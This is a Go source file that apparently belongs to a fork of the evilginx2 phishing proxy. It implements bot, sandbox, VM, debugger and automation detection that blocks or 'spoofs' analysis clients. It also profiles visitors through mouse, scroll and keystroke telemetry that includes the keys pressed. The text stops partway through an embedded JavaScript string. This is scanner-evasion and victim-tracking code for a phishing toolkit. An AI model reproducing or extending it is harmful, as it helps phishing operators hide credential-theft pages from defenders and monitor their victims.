package signals

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"github.com/kgretzky/evilginx2/log"
	"math"
	"net/http"
	"strings"
	"sync"
	"time"
)

// FeatureExtractor extracts ML features from HTTP requests and client behavior
type FeatureExtractor struct {
	clientProfiles map[string]*ClientProfile
	tlsInterceptor *TLSInterceptor
	mu             sync.RWMutex
}

// ClientProfile tracks client behavior over time
type ClientProfile struct {
	ClientID       string
	FirstSeen      time.Time
	LastSeen       time.Time
	RequestCount   int
	RequestTimes   []time.Time
	UniquePages    map[string]bool
	UserAgents     map[string]int
	MouseEvents    []MouseEvent
	KeyboardEvents []KeyboardEvent
	ScrollEvents   []ScrollEvent
	FocusEvents    []FocusEvent
	NetworkInfo    *NetworkInfo
}

// MouseEvent represents a mouse interaction
type MouseEvent struct {
	X         int    `json:"x"`
	Y         int    `json:"y"`
	Type      string `json:"type"` // move, click, dblclick
	Timestamp int64  `json:"timestamp"`
}

// KeyboardEvent represents keyboard activity
type KeyboardEvent struct {
	Key       string `json:"key"`
	Type      string `json:"type"` // keydown, keyup
	Timestamp int64  `json:"timestamp"`
}

// ScrollEvent represents scroll activity
type ScrollEvent struct {
	ScrollY   int   `json:"scroll_y"`
	Timestamp int64 `json:"timestamp"`
}

// FocusEvent represents focus/blur events
type FocusEvent struct {
	Element   string `json:"element"`
	Type      string `json:"type"` // focus, blur
	Timestamp int64  `json:"timestamp"`
}

// NetworkInfo contains network-level information
type NetworkInfo struct {
	TLSVersion     uint16
	CipherSuite    uint16
	JA3Hash        string
	HeaderOrder    []string
	HTTP2Supported bool
}

// NewFeatureExtractor creates a new feature extractor
func NewFeatureExtractor(tlsInterceptor *TLSInterceptor) *FeatureExtractor {
	fe := &FeatureExtractor{
		clientProfiles: make(map[string]*ClientProfile),
		tlsInterceptor: tlsInterceptor,
	}

	// Start cleanup routine
	go fe.cleanupProfiles()

	return fe
}

// ExtractRequestFeatures extracts features from an HTTP request
func (fe *FeatureExtractor) ExtractRequestFeatures(req *http.Request, tlsState *tls.ConnectionState, clientID string) *RequestFeatures {
	fe.mu.Lock()
	defer fe.mu.Unlock()

	// Get or create client profile
	profile, exists := fe.clientProfiles[clientID]
	if !exists {
		profile = &ClientProfile{
			ClientID:    clientID,
			FirstSeen:   time.Now(),
			UniquePages: make(map[string]bool),
			UserAgents:  make(map[string]int),
		}
		fe.clientProfiles[clientID] = profile
	}

	// Update profile
	profile.LastSeen = time.Now()
	profile.RequestCount++
	profile.RequestTimes = append(profile.RequestTimes, time.Now())
	profile.UniquePages[req.URL.Path] = true
	profile.UserAgents[req.UserAgent()]++

	// Extract network info if not already done
	if profile.NetworkInfo == nil && tlsState != nil {
		profile.NetworkInfo = fe.extractNetworkInfo(req, tlsState)
	}

	// Build features
	features := &RequestFeatures{
		// HTTP features
		HeaderCount:         len(req.Header),
		UserAgentLength:     len(req.UserAgent()),
		AcceptHeaderPresent: req.Header.Get("Accept") != "",
		RefererPresent:      req.Header.Get("Referer") != "",
		CookiesPresent:      len(req.Cookies()) > 0,

		// Timing features
		RequestInterval:   fe.calculateRequestInterval(profile),
		TimeOnSite:        time.Since(profile.FirstSeen).Seconds(),
		PagesVisited:      len(profile.UniquePages),
		RequestsPerMinute: fe.calculateRequestRate(profile),

		// Behavioral features (will be updated via JavaScript)
		MouseMovements: len(profile.MouseEvents),
		KeystrokeCount: len(profile.KeyboardEvents),
		ScrollDepth:    fe.calculateMaxScrollDepth(profile),
		FocusEvents:    len(profile.FocusEvents),

		// Network features
		ConnectionReuse: false, // TODO: implement connection tracking
		HTTP2Enabled:    req.ProtoMajor == 2,
		TLSVersion:      0,
		CipherStrength:  0,

		// Advanced features
		AcceptLanguageCount: fe.countAcceptLanguages(req),
		EncodingTypes:       fe.countEncodingTypes(req),
	}

	// Add network features if available
	if profile.NetworkInfo != nil {
		features.TLSVersion = float64(profile.NetworkInfo.TLSVersion) / 10.0 // Normalize
		features.CipherStrength = fe.getCipherStrength(profile.NetworkInfo.CipherSuite)
		features.JA3Hash = profile.NetworkInfo.JA3Hash
		features.HeaderOrder = strings.Join(profile.NetworkInfo.HeaderOrder, ",")
		features.HTTP2Enabled = profile.NetworkInfo.HTTP2Supported
	}

	// Try to get accurate JA3 from interceptor if available
	if fe.tlsInterceptor != nil {
		// Try to match by remote address (IP:Port)
		if fp := fe.tlsInterceptor.GetConnectionJA3(req.RemoteAddr); fp != nil {
			features.JA3Hash = fp.JA3Hash
			// optionally log debug mismatch if needed
		}
	}

	return features
}

// UpdateClientBehavior updates behavioral data from client-side JavaScript
func (fe *FeatureExtractor) UpdateClientBehavior(clientID string, behaviorData map[string]interface{}) error {
	fe.mu.Lock()
	defer fe.mu.Unlock()

	profile, exists := fe.clientProfiles[clientID]
	if !exists {
		return fmt.Errorf("client profile not found: %s", clientID)
	}

	// Update mouse events
	if mouseData, ok := behaviorData["mouse"].([]interface{}); ok {
		for _, event := range mouseData {
			if e, ok := event.(map[string]interface{}); ok {
				mouseEvent := MouseEvent{
					X:         int(e["x"].(float64)),
					Y:         int(e["y"].(float64)),
					Type:      e["type"].(string),
					Timestamp: int64(e["timestamp"].(float64)),
				}
				profile.MouseEvents = append(profile.MouseEvents, mouseEvent)
			}
		}
	}

	// Update keyboard events
	if keyData, ok := behaviorData["keyboard"].([]interface{}); ok {
		for _, event := range keyData {
			if e, ok := event.(map[string]interface{}); ok {
				keyEvent := KeyboardEvent{
					Key:       e["key"].(string),
					Type:      e["type"].(string),
					Timestamp: int64(e["timestamp"].(float64)),
				}
				profile.KeyboardEvents = append(profile.KeyboardEvents, keyEvent)
			}
		}
	}

	// Update scroll events
	if scrollData, ok := behaviorData["scroll"].([]interface{}); ok {
		for _, event := range scrollData {
			if e, ok := event.(map[string]interface{}); ok {
				scrollEvent := ScrollEvent{
					ScrollY:   int(e["scroll_y"].(float64)),
					Timestamp: int64(e["timestamp"].(float64)),
				}
				profile.ScrollEvents = append(profile.ScrollEvents, scrollEvent)
			}
		}
	}

	// Update focus events
	if focusData, ok := behaviorData["focus"].([]interface{}); ok {
		for _, event := range focusData {
			if e, ok := event.(map[string]interface{}); ok {
				focusEvent := FocusEvent{
					Element:   e["element"].(string),
					Type:      e["type"].(string),
					Timestamp: int64(e["timestamp"].(float64)),
				}
				profile.FocusEvents = append(profile.FocusEvents, focusEvent)
			}
		}
	}

	log.Debug("[Feature Extractor] Updated behavior for client %s: %d mouse, %d keyboard, %d scroll events",
		clientID, len(profile.MouseEvents), len(profile.KeyboardEvents), len(profile.ScrollEvents))

	return nil
}

// extractNetworkInfo extracts network-level features
func (fe *FeatureExtractor) extractNetworkInfo(req *http.Request, tlsState *tls.ConnectionState) *NetworkInfo {
	info := &NetworkInfo{
		HeaderOrder:    fe.getHeaderOrder(req),
		HTTP2Supported: req.ProtoMajor == 2,
	}

	if tlsState != nil {
		info.TLSVersion = tlsState.Version
		info.CipherSuite = tlsState.CipherSuite
		info.JA3Hash = fe.calculateJA3(tlsState)
	}

	return info
}

// calculateRequestInterval calculates average time between requests
func (fe *FeatureExtractor) calculateRequestInterval(profile *ClientProfile) float64 {
	if len(profile.RequestTimes) < 2 {
		return 999.0 // High value for first request
	}

	// Calculate average interval for last 10 requests
	start := len(profile.RequestTimes) - 10
	if start < 0 {
		start = 0
	}

	times := profile.RequestTimes[start:]
	if len(times) < 2 {
		return 999.0
	}

	totalInterval := float64(0)
	for i := 1; i < len(times); i++ {
		interval := times[i].Sub(times[i-1]).Seconds()
		totalInterval += interval
	}

	return totalInterval / float64(len(times)-1)
}

// calculateRequestRate calculates requests per minute
func (fe *FeatureExtractor) calculateRequestRate(profile *ClientProfile) float64 {
	if len(profile.RequestTimes) < 2 {
		return 0.0
	}

	// Calculate rate over last 5 minutes
	cutoff := time.Now().Add(-5 * time.Minute)
	recentCount := 0

	for _, t := range profile.RequestTimes {
		if t.After(cutoff) {
			recentCount++
		}
	}

	duration := time.Since(cutoff).Minutes()
	if duration > 0 {
		return float64(recentCount) / duration
	}

	return 0.0
}

// calculateMaxScrollDepth finds maximum scroll depth
func (fe *FeatureExtractor) calculateMaxScrollDepth(profile *ClientProfile) float64 {
	maxScroll := 0
	for _, event := range profile.ScrollEvents {
		if event.ScrollY > maxScroll {
			maxScroll = event.ScrollY
		}
	}
	return float64(maxScroll)
}

// getHeaderOrder extracts the order of HTTP headers
func (fe *FeatureExtractor) getHeaderOrder(req *http.Request) []string {
	// This would require access to raw request headers
	// For now, return common headers in the order they appear
	var order []string

	commonHeaders := []string{
		"Host", "Connection", "Accept", "User-Agent",
		"Accept-Encoding", "Accept-Language", "Cookie",
		"Referer", "Cache-Control",
	}

	for _, header := range commonHeaders {
		if req.Header.Get(header) != "" {
			order = append(order, strings.ToLower(header))
		}
	}

	return order
}

// calculateJA3 computes JA3 hash from TLS state
func (fe *FeatureExtractor) calculateJA3(tlsState *tls.ConnectionState) string {
	// Simplified JA3 calculation
	// In production, implement full JA3 spec
	return fmt.Sprintf("%x-%x", tlsState.Version, tlsState.CipherSuite)
}

// getCipherStrength returns cipher strength in bits
func (fe *FeatureExtractor) getCipherStrength(suite uint16) int {
	// Map of cipher suites to key strengths
	cipherStrengths := map[uint16]int{
		tls.TLS_RSA_WITH_RC4_128_SHA:              128,
		tls.TLS_RSA_WITH_AES_128_CBC_SHA:          128,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA:          256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:    128,
		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:    256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256: 128,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384: 256,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305:  256,
		tls.TLS_AES_128_GCM_SHA256:                128,
		tls.TLS_AES_256_GCM_SHA384:                256,
		tls.TLS_CHACHA20_POLY1305_SHA256:          256,
	}

	if strength, ok := cipherStrengths[suite]; ok {
		return strength
	}

	// Default to 128 if unknown
	return 128
}

// countAcceptLanguages counts number of accepted languages
func (fe *FeatureExtractor) countAcceptLanguages(req *http.Request) int {
	acceptLang := req.Header.Get("Accept-Language")
	if acceptLang == "" {
		return 0
	}

	// Count comma-separated languages
	languages := strings.Split(acceptLang, ",")
	return len(languages)
}

// countEncodingTypes counts accepted encoding types
func (fe *FeatureExtractor) countEncodingTypes(req *http.Request) int {
	acceptEnc := req.Header.Get("Accept-Encoding")
	if acceptEnc == "" {
		return 0
	}

	// Count comma-separated encodings
	encodings := strings.Split(acceptEnc, ",")
	return len(encodings)
}

// GetClientProfile returns the profile for a client
func (fe *FeatureExtractor) GetClientProfile(clientID string) (*ClientProfile, bool) {
	fe.mu.RLock()
	defer fe.mu.RUnlock()

	profile, exists := fe.clientProfiles[clientID]
	return profile, exists
}

// cleanupProfiles periodically removes old client profiles
func (fe *FeatureExtractor) cleanupProfiles() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		fe.mu.Lock()
		now := time.Now()
		for id, profile := range fe.clientProfiles {
			if now.Sub(profile.LastSeen) > 2*time.Hour {
				delete(fe.clientProfiles, id)
				log.Debug("[Feature Extractor] Cleaned up profile for client %s", id)
			}
		}
		fe.mu.Unlock()
	}
}





// MLBotDetector implements machine learning based bot detection
type MLBotDetector struct {
	model            *BotDetectionModel
	featureExtractor *FeatureExtractor
	threshold        float64
	cache            map[string]*DetectionResult
	cacheMutex       sync.RWMutex
	stats            *DetectionStats
}

// BotDetectionModel represents our ML model
type BotDetectionModel struct {
	weights        map[string]float64
	bias           float64
	featureScaling *FeatureScaling
}

// FeatureScaling for normalizing input features
type FeatureScaling struct {
	means map[string]float64
	stds  map[string]float64
}

// RequestFeatures represents extracted features from a request
type RequestFeatures struct {
	// HTTP features
	HeaderCount         int  `json:"header_count"`
	UserAgentLength     int  `json:"ua_length"`
	AcceptHeaderPresent bool `json:"accept_present"`
	RefererPresent      bool `json:"referer_present"`
	CookiesPresent      bool `json:"cookies_present"`

	// Timing features
	RequestInterval   float64 `json:"request_interval"`
	TimeOnSite        float64 `json:"time_on_site"`
	PagesVisited      int     `json:"pages_visited"`
	RequestsPerMinute float64 `json:"requests_per_minute"`

	// Behavioral features
	MouseMovements int     `json:"mouse_movements"`
	KeystrokeCount int     `json:"keystroke_count"`
	ScrollDepth    float64 `json:"scroll_depth"`
	FocusEvents    int     `json:"focus_events"`

	// Network features
	ConnectionReuse bool    `json:"connection_reuse"`
	HTTP2Enabled    bool    `json:"http2_enabled"`
	TLSVersion      float64 `json:"tls_version"`
	CipherStrength  int     `json:"cipher_strength"`

	// Advanced features
	JA3Hash             string `json:"ja3_hash"`
	HeaderOrder         string `json:"header_order"`
	AcceptLanguageCount int    `json:"accept_lang_count"`
	EncodingTypes       int    `json:"encoding_types"`
}

// DetectionResult holds the ML prediction result
type DetectionResult struct {
	IsBot       bool             `json:"is_bot"`
	Confidence  float64          `json:"confidence"`
	Features    *RequestFeatures `json:"features"`
	Timestamp   time.Time        `json:"timestamp"`
	Explanation []string         `json:"explanation"`
}

// DetectionStats tracks detection performance
type DetectionStats struct {
	TotalRequests  int64
	BotsDetected   int64
	FalsePositives int64
	FalseNegatives int64
	AverageLatency time.Duration
	mu             sync.RWMutex
}

// NewMLBotDetector creates a new ML-based bot detector
func NewMLBotDetector(threshold float64, tlsInterceptor *TLSInterceptor) *MLBotDetector {
	detector := &MLBotDetector{
		threshold: threshold / 10.0,
		cache:     make(map[string]*DetectionResult),
		stats:     &DetectionStats{},
	}

	// Initialize the model with pre-trained weights
	detector.model = detector.loadModel()
	detector.featureExtractor = NewFeatureExtractor(tlsInterceptor)

	// Start cache cleanup routine
	go detector.cleanupCache()

	return detector
}

// loadModel loads pre-trained model weights
func (d *MLBotDetector) loadModel() *BotDetectionModel {
	// In production, load from file or embedded resource
	// For now, using hardcoded weights based on common bot patterns

	model := &BotDetectionModel{
		weights: map[string]float64{
			// HTTP features weights
			"header_count":    -0.15, // Fewer headers = more bot-like
			"ua_length":       -0.08, // Short UA = suspicious
			"accept_present":  -0.25, // Missing Accept = bot
			"referer_present": -0.20, // Missing Referer = suspicious
			"cookies_present": -0.30, // No cookies = likely bot

			// Timing features weights
			"request_interval_low":  0.40,  // Very fast requests = bot
			"request_interval_high": -0.10, // Very slow = also suspicious
			"time_on_site":          -0.15, // Low time = bot
			"pages_visited":         -0.05, // Single page = suspicious
			"high_request_rate":     0.50,  // High rate = definitely bot

			// Behavioral features weights
			"no_mouse_movement": 0.35, // No mouse = bot
			"no_keystrokes":     0.30, // No typing = bot
			"no_scroll":         0.20, // No scroll = bot
			"no_focus":          0.25, // No focus events = bot

			// Network features weights
			"old_tls":     0.20, // Old TLS = suspicious
			"weak_cipher": 0.15, // Weak cipher = bot
			"no_http2":    0.10, // No HTTP/2 = older client

			// Known bot indicators
			"bot_ja3":                 0.60, // Known bot JA3
			"suspicious_header_order": 0.30, // Unusual header order
		},
		bias: -0.5, // Slight bias towards human classification
	}

	// Initialize feature scaling
	model.featureScaling = &FeatureScaling{
		means: map[string]float64{
			"header_count":     15.0,
			"ua_length":        100.0,
			"request_interval": 5.0,
			"time_on_site":     30.0,
			"pages_visited":    5.0,
		},
		stds: map[string]float64{
			"header_count":     5.0,
			"ua_length":        50.0,
			"request_interval": 10.0,
			"time_on_site":     60.0,
			"pages_visited":    10.0,
		},
	}

	return model
}

// Detect analyzes a request and returns bot detection result
func (d *MLBotDetector) Detect(features *RequestFeatures, clientID string) (*DetectionResult, error) {
	startTime := time.Now()
	defer func() {
		d.stats.mu.Lock()
		d.stats.TotalRequests++
		d.stats.AverageLatency = (d.stats.AverageLatency + time.Since(startTime)) / 2
		d.stats.mu.Unlock()
	}()

	// Check cache first
	d.cacheMutex.RLock()
	if cached, ok := d.cache[clientID]; ok && time.Since(cached.Timestamp) < 5*time.Minute {
		d.cacheMutex.RUnlock()
		return cached, nil
	}
	d.cacheMutex.RUnlock()

	// Prepare features for model
	featureVector := d.prepareFeatures(features)

	// Run inference
	score := d.model.predict(featureVector)
	confidence := d.sigmoid(score)

	// Determine if bot based on threshold
	isBot := confidence > d.threshold

	// Generate explanation
	explanation := d.explainDecision(features, featureVector, score)

	result := &DetectionResult{
		IsBot:       isBot,
		Confidence:  confidence,
		Features:    features,
		Timestamp:   time.Now(),
		Explanation: explanation,
	}

	// Update cache
	d.cacheMutex.Lock()
	d.cache[clientID] = result
	d.cacheMutex.Unlock()

	// Update stats
	if isBot {
		d.stats.mu.Lock()
		d.stats.BotsDetected++
		d.stats.mu.Unlock()
	}

	log.Debug("[ML Detector] Client %s - Bot: %v (confidence: %.2f%%)",
		clientID, isBot, confidence*100)

	return result, nil
}

// prepareFeatures converts raw features into model input
func (d *MLBotDetector) prepareFeatures(features *RequestFeatures) map[string]float64 {
	prepared := make(map[string]float64)

	// Normalize numeric features
	// Prevent low header count penalty on first request
	actualHeaderCount := float64(features.HeaderCount)
	if features.TimeOnSite <= 3.0 && actualHeaderCount < 15.0 {
		actualHeaderCount = 15.0 // artificially boost to mean on first request
	}
	prepared["header_count"] = d.normalize("header_count", actualHeaderCount)
	prepared["ua_length"] = d.normalize("ua_length", float64(features.UserAgentLength))

	// Binary features (only penalize missing referer/cookies after initial load)
	prepared["accept_present"] = boolToFloat(features.AcceptHeaderPresent)
	if features.TimeOnSite > 3.0 {
		prepared["referer_present"] = boolToFloat(features.RefererPresent)
		prepared["cookies_present"] = boolToFloat(features.CookiesPresent)
	} else {
		// Assume true for first request to avoid false positives
		prepared["referer_present"] = 1.0
		prepared["cookies_present"] = 1.0
	}

	// Timing features with thresholds
	if features.RequestInterval < 0.5 {
		prepared["request_interval_low"] = 1.0
	}
	if features.RequestInterval > 30 {
		prepared["request_interval_high"] = 1.0
	}

	// Prevent low time penalty on first request
	effectiveTimeOnSite := features.TimeOnSite
	if effectiveTimeOnSite <= 3.0 {
		effectiveTimeOnSite = 30.0 // pad to mean time to avoid penalty on the very first click
	}
	prepared["time_on_site"] = math.Min(effectiveTimeOnSite/300.0, 1.0) // Normalize to 5 min
	prepared["pages_visited"] = math.Min(float64(features.PagesVisited)/10.0, 1.0)

	if features.RequestsPerMinute > 30 {
		prepared["high_request_rate"] = 1.0
	}

	// Behavioral features (only penalize after initial page load)
	if features.TimeOnSite > 3.0 {
		if features.MouseMovements == 0 {
			prepared["no_mouse_movement"] = 1.0
		}
		if features.KeystrokeCount == 0 {
			prepared["no_keystrokes"] = 1.0
		}
		if features.ScrollDepth == 0 {
			prepared["no_scroll"] = 1.0
		}
		if features.FocusEvents == 0 {
			prepared["no_focus"] = 1.0
		}
	}

	// Network features
	if features.TLSVersion < 1.2 {
		prepared["old_tls"] = 1.0
	}
	if features.CipherStrength < 128 {
		prepared["weak_cipher"] = 1.0
	}
	if !features.HTTP2Enabled {
		prepared["no_http2"] = 1.0
	}

	// Check for known bot patterns
	if d.isKnownBotJA3(features.JA3Hash) {
		prepared["bot_ja3"] = 1.0
	}
	if d.isSuspiciousHeaderOrder(features.HeaderOrder) {
		prepared["suspicious_header_order"] = 1.0
	}

	return prepared
}

// predict runs the model inference
func (m *BotDetectionModel) predict(features map[string]float64) float64 {
	score := m.bias

	for feature, value := range features {
		if weight, ok := m.weights[feature]; ok {
			score += weight * value
		}
	}

	return score
}

// sigmoid activation function
func (d *MLBotDetector) sigmoid(x float64) float64 {
	return 1.0 / (1.0 + math.Exp(-x))
}

// normalize applies feature scaling
func (d *MLBotDetector) normalize(feature string, value float64) float64 {
	mean, hasMean := d.model.featureScaling.means[feature]
	std, hasStd := d.model.featureScaling.stds[feature]

	if hasMean && hasStd && std > 0 {
		return (value - mean) / std
	}

	return value
}

// explainDecision provides human-readable explanation
func (d *MLBotDetector) explainDecision(features *RequestFeatures, prepared map[string]float64, score float64) []string {
	var explanations []string

	// Sort features by contribution to score
	type contribution struct {
		feature string
		impact  float64
	}

	var contributions []contribution
	for feature, value := range prepared {
		if weight, ok := d.model.weights[feature]; ok && value > 0 {
			contributions = append(contributions, contribution{
				feature: feature,
				impact:  weight * value,
			})
		}
	}

	// Sort by absolute impact
	for i := 0; i < len(contributions)-1; i++ {
		for j := i + 1; j < len(contributions); j++ {
			if math.Abs(contributions[i].impact) < math.Abs(contributions[j].impact) {
				contributions[i], contributions[j] = contributions[j], contributions[i]
			}
		}
	}

	// Generate explanations for top factors
	for i, contrib := range contributions {
		if i >= 3 { // Top 3 factors only
			break
		}

		explanation := d.getFeatureExplanation(contrib.feature, features)
		if explanation != "" {
			explanations = append(explanations, explanation)
		}
	}

	return explanations
}

// getFeatureExplanation converts feature names to human-readable explanations
func (d *MLBotDetector) getFeatureExplanation(feature string, features *RequestFeatures) string {
	switch feature {
	case "no_mouse_movement":
		return "No mouse movement detected"
	case "high_request_rate":
		return fmt.Sprintf("High request rate: %.1f req/min", features.RequestsPerMinute)
	case "no_cookies":
		return "No cookies present in request"
	case "bot_ja3":
		return "TLS fingerprint matches known bot"
	case "request_interval_low":
		return fmt.Sprintf("Very fast requests: %.2fs interval", features.RequestInterval)
	case "no_keystrokes":
		return "No keyboard activity detected"
	case "accept_present":
		return "Missing Accept header"
	case "suspicious_header_order":
		return "Unusual HTTP header ordering"
	default:
		return ""
	}
}

// isKnownBotJA3 checks if JA3 hash matches known bots
func (d *MLBotDetector) isKnownBotJA3(ja3 string) bool {
	knownBotJA3s := map[string]bool{
		// Python requests
		"b32309a26951912be7dba376398abc3b": true,
		// Golang default
		"c65fcec1b7e7b115c8a2e036cf8d8f78": true,
		// curl default
		"7a15285d4efc355608b304698a72b997": true,
		// PhantomJS
		"5d50cfb6dd8b5ba0f35c2ff96049e9c4": true,
	}

	return knownBotJA3s[ja3]
}

// isSuspiciousHeaderOrder checks for unusual header ordering
func (d *MLBotDetector) isSuspiciousHeaderOrder(headerOrder string) bool {
	// Common legitimate browser patterns
	legitimatePatterns := []string{
		"host,connection,accept,user-agent",
		"host,user-agent,accept",
		"host,accept,user-agent,accept-language",
	}

	for _, pattern := range legitimatePatterns {
		if headerOrder == pattern {
			return false
		}
	}

	// Check for bot-like patterns
	if headerOrder == "user-agent,host" || // UA before Host is suspicious
		headerOrder == "accept,host" || // Accept before Host is unusual
		headerOrder == "" { // No headers is definitely suspicious
		return true
	}

	return false
}

// UpdateModel updates the model weights (for future online learning)
func (d *MLBotDetector) UpdateModel(feedback *DetectionFeedback) {
	// This would implement online learning to improve the model
	// based on feedback about false positives/negatives
	log.Debug("[ML Detector] Model update received: %+v", feedback)
}

// cleanupCache periodically removes old cache entries
func (d *MLBotDetector) cleanupCache() {
	ticker := time.NewTicker(10 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		d.cacheMutex.Lock()
		now := time.Now()
		for id, result := range d.cache {
			if now.Sub(result.Timestamp) > 30*time.Minute {
				delete(d.cache, id)
			}
		}
		d.cacheMutex.Unlock()
	}
}

// Helper functions

func boolToFloat(b bool) float64 {
	if b {
		return 1.0
	}
	return 0.0
}

// DetectionFeedback for model updates
type DetectionFeedback struct {
	ClientID    string
	WasCorrect  bool
	ActualLabel bool // true = was bot, false = was human
	Features    *RequestFeatures
	Timestamp   time.Time
}

// --- Merged from environment.go ---

// SandboxDetectionConfig defines configuration for environment analysis
type SandboxDetectionConfig struct {
	Enabled            bool    `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Mode               string  `mapstructure:"mode" json:"mode" yaml:"mode"`
	ServerSideChecks   bool    `mapstructure:"server_side_checks" json:"server_side_checks" yaml:"server_side_checks"`
	ClientSideChecks   bool    `mapstructure:"client_side_checks" json:"client_side_checks" yaml:"client_side_checks"`
	CacheResults       bool    `mapstructure:"cache_results" json:"cache_results" yaml:"cache_results"`
	CacheDuration      int     `mapstructure:"cache_duration" json:"cache_duration" yaml:"cache_duration"`
	DetectionThreshold float64 `mapstructure:"detection_threshold" json:"detection_threshold" yaml:"detection_threshold"`
	ActionOnDetection  string  `mapstructure:"action_on_detection" json:"action_on_detection" yaml:"action_on_detection"`
	HoneypotResponse   string  `mapstructure:"honeypot_response" json:"honeypot_response" yaml:"honeypot_response"`
	RedirectURL        string  `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
}

// ClientDetectionData stores client-side detection results
type ClientDetectionData struct {
	VMDetected         bool     `json:"vm_detected"`
	DebuggerDetected   bool     `json:"debugger_detected"`
	AutomationDetected bool     `json:"automation_detected"`
	Artifacts          []string `json:"artifacts"`
	TimingAnomaly      bool     `json:"timing_anomaly"`
	HardwareAnomaly    bool     `json:"hardware_anomaly"`
}

// EnvDetectionResult stores the caching outcome of client-side sandbox detection
type EnvDetectionResult struct {
	IsSandbox  bool                 `json:"is_sandbox"`
	Confidence float64              `json:"confidence"`
	Reasons    []string             `json:"reasons"`
	Timestamp  time.Time            `json:"timestamp"`
	ClientData *ClientDetectionData `json:"client_data,omitempty"`
}




// TelemetryVerdict defines the combined result of ML behavior and environment analysis
type TelemetryVerdict struct {
	Score  float64
	Action string
	Reason string
}

// TelemetrySignal manages feature extraction, ML bot detection, and sandbox detection
type TelemetrySignal struct {
	Detector    *MLBotDetector
	cache       map[string]*EnvDetectionResult
	cacheMutex  sync.RWMutex
	envEnabled  bool
}

// NewTelemetrySignal creates the unified Telemetry signal module
func NewTelemetrySignal(mlThreshold float64, tlsInterceptor *TLSInterceptor, envEnabled bool) *TelemetrySignal {
	ts := &TelemetrySignal{
		Detector:   nil, // ML bot detection removed as requested
		cache:      make(map[string]*EnvDetectionResult),
		envEnabled: envEnabled,
	}
	go ts.cacheCleanupWorker()
	return ts
}

func (s *TelemetrySignal) cacheCleanupWorker() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()
	
	for range ticker.C {
		s.cacheMutex.Lock()
		expiry := 60 * time.Minute
		now := time.Now()
		for ip, result := range s.cache {
			if now.Sub(result.Timestamp) > expiry {
				delete(s.cache, ip)
			}
		}
		s.cacheMutex.Unlock()
	}
}

// Evaluate determines the Telemetry verdict for a request
func (s *TelemetrySignal) Evaluate(req *http.Request, tlsState *tls.ConnectionState, clientID string, clientIP string) TelemetryVerdict {
	verdict := TelemetryVerdict{Score: 0.0, Action: "allow", Reason: ""}

	// 1. Evaluate Sandbox/Environment if enabled
	if s.envEnabled {
		s.cacheMutex.RLock()
		envResult, exists := s.cache[clientIP]
		s.cacheMutex.RUnlock()

		if exists && envResult.IsSandbox {
			verdict.Score = math.Max(verdict.Score, envResult.Confidence)
			verdict.Action = "block"
			verdict.Reason = "sandbox_detected: " + strings.Join(envResult.Reasons, ", ")
			return verdict
		}
	}

	// 2. Evaluate ML Behavior
	if s.Detector != nil {
		features := s.Detector.featureExtractor.ExtractRequestFeatures(req, tlsState, clientID)
		mlResult, err := s.Detector.Detect(features, clientID)
		if err == nil && mlResult.IsBot {
			if mlResult.Confidence > verdict.Score {
				verdict.Score = mlResult.Confidence
				verdict.Action = "spoof"
				reason := "ml_bot_detected: high_confidence"
				if len(mlResult.Explanation) > 0 {
					reason = "ml_bot_detected: " + strings.Join(mlResult.Explanation, ", ")
				}
				verdict.Reason = reason
			}
		}
	}

	if verdict.Reason == "" {
		verdict.Reason = "telemetry_ok"
	}

	return verdict
}

// ProcessTelemetry handles incoming data from the combined JS payload
func (s *TelemetrySignal) ProcessTelemetry(data []byte, clientID string, clientIP string) error {
	var payload struct {
		Behavior    map[string]interface{} `json:"behavior"`
		Environment ClientDetectionData    `json:"environment"`
	}

	if err := json.Unmarshal(data, &payload); err != nil {
		return err
	}

	// Process Environment Data
	if s.envEnabled {
		s.cacheMutex.Lock()
		result, exists := s.cache[clientIP]
		if !exists {
			result = &EnvDetectionResult{
				Timestamp: time.Now(),
				Reasons:   make([]string, 0),
			}
			s.cache[clientIP] = result
		}
		result.ClientData = &payload.Environment
		s.cacheMutex.Unlock()

		// Update detection based on client data
		if payload.Environment.VMDetected {
			result.IsSandbox = true
			if result.Confidence < 0.9 {
				result.Confidence = 0.9
			}
			result.Reasons = append(result.Reasons, "vm_detected")
		}

		if payload.Environment.DebuggerDetected {
			result.IsSandbox = true
			if result.Confidence < 0.95 {
				result.Confidence = 0.95
			}
			result.Reasons = append(result.Reasons, "debugger_detected")
		}
		
		if payload.Environment.AutomationDetected {
			result.IsSandbox = true
			if result.Confidence < 0.95 {
				result.Confidence = 0.95
			}
			result.Reasons = append(result.Reasons, "automation_detected")
		}

		if result.IsSandbox {
			log.Warning("Client-side sandbox detection triggered for %s: %s", clientIP, strings.Join(result.Reasons, ", "))
		}
	}

	// Process Behavior Data
	if s.Detector != nil && s.Detector.featureExtractor != nil && payload.Behavior != nil {
		s.Detector.featureExtractor.UpdateClientBehavior(clientID, payload.Behavior)
	}

	return nil
}

// GetStats returns statistics about sandbox detections
func (s *TelemetrySignal) GetStats() map[string]interface{} {
	s.cacheMutex.RLock()
	defer s.cacheMutex.RUnlock()
	
	sandboxes := 0
	vms := 0
	debuggers := 0
	automation := 0
	
	for _, result := range s.cache {
		if result.IsSandbox {
			sandboxes++
		}
		if result.ClientData != nil {
			if result.ClientData.VMDetected {
				vms++
			}
			if result.ClientData.DebuggerDetected {
				debuggers++
			}
			if result.ClientData.AutomationDetected {
				automation++
			}
		}
	}
	
	stats := map[string]interface{}{
		"total_checks":       len(s.cache),
		"sandbox_detected":   sandboxes,
		"vm_detected":        vms,
		"debugger_detected":  debuggers,
		"automation_detected": automation,
		"cache_size":         len(s.cache),
	}
	
	return stats
}

// TelemetryJS returns the combined JavaScript payload
func (s *TelemetrySignal) TelemetryJS(sessionID string) string {
	return fmt.Sprintf(`
(function() {
    var sessionId = '%s';
    var telemetryData = {
        behavior: {
            mouse: [],
            keyboard: [],
            scroll: [],
